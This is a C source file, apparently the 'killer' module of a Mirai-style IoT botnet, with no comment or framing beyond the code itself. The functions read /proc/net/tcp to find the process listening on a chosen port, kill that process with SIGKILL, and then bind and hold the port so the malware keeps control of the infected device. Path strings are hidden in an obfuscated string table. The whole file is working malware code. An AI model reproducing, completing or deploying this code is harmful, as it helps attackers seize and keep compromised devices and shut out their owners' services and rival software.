#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "util.h"
#include "tcp.h"
#include "table.h"

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    fd = open(enc[PROC_NET_TCP].string, O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    if (util_strlen(inode) == 0)
    {
        return 0;
    }

    if ((dir = opendir(enc[PROC_DIR].string)) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;
    
            if (*pid < '0' || *pid > '9')
                continue;
    
            util_strcpy(ptr_path, enc[PROC_DIR].string);
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), "/exe");
    
            if (readlink(path, exe, PATH_MAX) == -1)
                continue;
    
            util_strcpy(ptr_path, enc[PROC_DIR].string);
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            strcat(ptr_path, enc[FD_DIR].string);

            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;
    
                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, enc[PROC_DIR].string);
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    strcat(ptr_path, enc[FD_DIR].string);
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);

                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                        if(_atoi(pid) == getppid()) {
                            ret = 0;
                            break;
                        }
    
                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);
    return ret;
}

BOOL terminate_service_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    char inode[16] = {0};
    char port_str[16];
    int fd;

    // Convert port to hexadecimal string
    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2) {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;
        port_str[0] = '0';
        port_str[1] = '0';
    }

    // Open /proc/net/tcp to find the port's inode
    fd = open(enc[PROC_NET_TCP].string, O_RDONLY);
    if (fd == -1) {
#ifdef DEBUG
        perror("Failed to open /proc/net/tcp");
#endif
        return FALSE;
    }

    while (util_fdgets(buffer, 512, fd) != NULL) {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;
        if (buffer[i] == 0) continue;

        i += 2;
        ii = i;
        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1) {
            int column_index = 0;
            BOOL in_column = FALSE;

            while (column_index < 7 && buffer[++i] != 0) {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else {
                    if (in_column == TRUE) column_index++;
                    in_column = FALSE;
                }
            }
            ii = i;
            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15) continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    if (util_strlen(inode) == 0) {
#ifdef DEBUG
        printf("[killer] Failed to find inode for port %d\n", ntohs(port));
#endif
        return FALSE;
    }

    // Look for the process that owns the inode
    if ((dir = opendir(enc[PROC_DIR_2].string)) != NULL) {
        while ((entry = readdir(dir)) != NULL) {
            if (*entry->d_name >= '0' && *entry->d_name <= '9') {
                char pid_str[16];
                util_strcpy(pid_str, entry->d_name);

                util_strcpy(path, enc[PROC_DIR].string);
                util_strcpy(path + util_strlen(path), pid_str);
                util_strcpy(path + util_strlen(path), enc[FD_DIR].string);

                if ((fd_dir = opendir(path)) != NULL) {
                    while ((fd_entry = readdir(fd_dir)) != NULL) {
                        char fd_path[PATH_MAX] = {0};

                        util_strcpy(fd_path, enc[PROC_DIR].string);
                        util_strcpy(fd_path + util_strlen(fd_path), pid_str);
                        util_strcpy(fd_path + util_strlen(fd_path), enc[FD_DIR_2].string);
                        util_strcpy(fd_path + util_strlen(fd_path), fd_entry->d_name);

                        if (readlink(fd_path, exe, PATH_MAX) != -1) {
                            if (util_stristr(exe, util_strlen(exe), inode) != -1) {
                                pid_t pid = atoi(pid_str);
                                kill(pid, SIGKILL);
#ifdef DEBUG
                                printf("[killer] Killed process %d on port %d\n", pid, ntohs(port));
#endif
                                closedir(fd_dir);
                                closedir(dir);

                                usleep(5000); // add delay so we wont get addr in use 
                                bind_and_hold_specific_port(port);
                                return TRUE;
                            }
                        }
                    }
                    closedir(fd_dir);
                }
            }
        }
        closedir(dir);
    }
#ifdef DEBUG
    printf("[killer] No process found on port %d\n", ntohs(port));
#endif
    return FALSE;
}

void bind_and_hold_specific_port(port_t port)
{
    struct sockaddr_in addr;
    int sockfd;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = port;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) >= 0) {
        if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
#ifdef DEBUG
            printf("[killer] Bound and holding port %d\n", ntohs(port));
#endif
            listen(sockfd, 1); // Keep the socket open to block reuse
        } else {
#ifdef DEBUG
            perror("[killer] Failed to bind port");
#endif
        }
    } else {
#ifdef DEBUG
        perror("[killer] Failed to create socket");
#endif
    }
}
